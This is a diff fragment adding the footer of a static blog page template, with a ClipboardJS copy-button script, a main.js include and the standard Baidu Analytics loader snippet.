+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+  <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?4d0e9f82e790a82153825a1c24f344dc";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+        </script>
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
